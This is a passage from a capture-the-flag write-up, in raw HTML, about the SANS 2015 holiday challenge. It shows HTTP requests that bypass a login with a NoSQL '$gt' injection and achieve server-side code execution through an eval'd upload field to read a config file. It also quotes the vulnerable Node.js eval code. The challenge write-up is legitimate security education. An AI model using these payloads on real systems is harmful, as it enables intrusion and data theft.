&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;52.64.191.71&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/\*;q=0.8&lt;/span&gt;
&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip, deflate&lt;/span&gt;
&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://52.64.191.71/?logout=1&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;sessionid=9VdoAi2pOEvmdCfZz0y9&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;45&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;$gt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;301&lt;/span&gt; &lt;span class="ne"&gt;Moved Permanently&lt;/span&gt;
&lt;span class="na"&gt;X-Powered-By&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;GIYH::SuperGnome by AtnasCorp&lt;/span&gt;
&lt;span class="na"&gt;Set-Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;sessionid=5KriPZf9AP8l8MGBVpA8; Path=/&lt;/span&gt;
&lt;span class="na"&gt;Location&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;/&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Sun, 20 Dec 2015 22:44:35 GMT&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This request means that the username must be &amp;quot;admin&amp;quot;, and that the associated
password must be greater than an empty string. Since such a user exists, the
application considers that we provided valid credentials, and happily opens
an authenticated web session.&lt;/p&gt;
&lt;p&gt;We can then get the configuration file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/files?d=gnome.conf&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;52.64.191.71&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/\*;q=0.8&lt;/span&gt;
&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip, deflate&lt;/span&gt;
&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://52.64.191.71/files&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;sessionid=5KriPZf9AP8l8MGBVpA8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;X-Powered-By&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;GIYH::SuperGnome by AtnasCorp&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Sun, 20 Dec 2015 22:44:57 GMT&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;339&lt;/span&gt;

Gnome Serial Number: THX1138
Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
Allow new subordinates?: YES
Camera monitoring?: YES
Audio monitoring?: YES
Camera update rate: 60min
Gnome mode: SuperGnome
Gnome name: SG-03
Allow file uploads?: YES
Allowed file formats: .png
Allowed file size: 512kb
Files directory: /gnome/www/files/
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The flag for this SuperGnome is &lt;code&gt;THX1138&lt;/code&gt;
(&lt;a class="reference external" href="https://en.wikipedia.org/wiki/THX_1138"&gt;geeky reference&lt;/a&gt;).&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id4"&gt;
&lt;h3&gt;&lt;a class="reference external" href="http://52.192.152.132"&gt;SuperGnome04&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;We can connect to this SuperGnome with our credentials (whew).
However, when we try to download the gnome.conf file from the
files tab, we get an error message:&lt;/p&gt;
&lt;img alt="sg04_download_fail.png" class="align-center" src="/images/sans-christmas-challenge-2015/sg04_download_fail.png" /&gt;
&lt;p&gt;Fortunately for us, this SuperGnome suffers from a remote code execution:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// File www/routes/index.js, line 153&lt;/span&gt;
&lt;span class="c1"&gt;// FILES UPLOAD&lt;/span&gt;
&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/files&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;upload&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;single&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;file&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;sessions&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;sessionid&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;logged_in&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;sessions&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;sessionid&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;user_level&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;99&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;// NEDFORD: this should be 99 not 100 so admins can upload&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;msgs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[];&lt;/span&gt;
    &lt;span class="nx"&gt;file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;file&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;file&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;mimetype&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;image/png&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Upload successful.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="hll"&gt;      &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;postproc_syntax&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;postproc&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;      &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;File upload syntax:&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;postproc_syntax&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;postproc_syntax&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;none&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;postproc_syntax&lt;/span&gt; &lt;span class="o"&gt;!==&lt;/span&gt; &lt;span class="kc"&gt;undefined&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Executing post process...&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;result&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="nx"&gt;d&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;          &lt;span class="nx"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;(&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;postproc_syntax&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;)&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;        &lt;span class="p"&gt;});&lt;/span&gt;
        &lt;span class="c1"&gt;// STUART: (WIP) working to improve image uploads to do some post processing.&lt;/span&gt;
        &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Post process result: &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;result&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;
      &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;File pending super-admin approval.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;msgs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;File not one of the approved formats: .png&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;msgs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt;
    &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;render&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;index&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;title&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;GIYH::ADMIN PORT V.01&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;session&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;sessions&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;sessionid&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
  &lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;When a file is uploaded, it's post-processed. To do so, the server
&lt;code&gt;eval&lt;/code&gt; s some code sent by us. Whoopsie! We can send arbitrary JavaScript
code, and it will be executed by the server. This means that we can send code
to read the configuration file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/files&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;52.192.152.132&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/\*;q=0.8&lt;/span&gt;
&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip, deflate&lt;/span&gt;
&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://52.192.152.132/files&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;sessionid=X7VWEHkmmlBfutfSWIKF&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;multipart/form-data; boundary=---------------------------1090026508808451371305736143&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;368&lt;/span&gt;

-----------------------------1090026508808451371305736143
Content-Disposition: form-data; name=&amp;quot;postproc&amp;quot;

require(&amp;#39;fs&amp;#39;).readFileSync(&amp;#39;/gnome/www/files/gnome.conf&amp;#39;, &amp;#39;utf8&amp;#39;, function (err, data) {})
-----------------------------1090026508808451371305736143
Content-Disposition: form-data; name=&amp;quot;file&amp;quot;; filename=&amp;quot;bar.png&amp;quot;
Content-Type: image/png

foo

-----------------------------1090026508808451371305736143--
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;X-Powered-By&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;GIYH::SuperGnome by AtnasCorp&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=utf-8&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;4208&lt;/span&gt;
&lt;span class="na"&gt;ETag&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;W/&amp;quot;1070-Jo7i+NGHd32e2cYWZTjmCQ&amp;quot;&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Sat, 26 Dec 2015 23:41:46 GMT&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;

&lt;span class="cp"&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;GIYH::ADMIN PORT V.01&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
[snip]
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;ul&lt;/span&gt; &lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;nav navbar-nav&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;li&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Home&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;li&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;li&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/cameras&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Cameras&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;li&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;li&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/files&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Files&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;li&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;li&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/gnomenet&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;GnomeNET&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;li&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;li&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/settings&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Settings&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;li&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;li&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/?logout=1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Logout&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;li&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;ul&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;nav&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt; &lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;jumbotron&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Files&lt;span 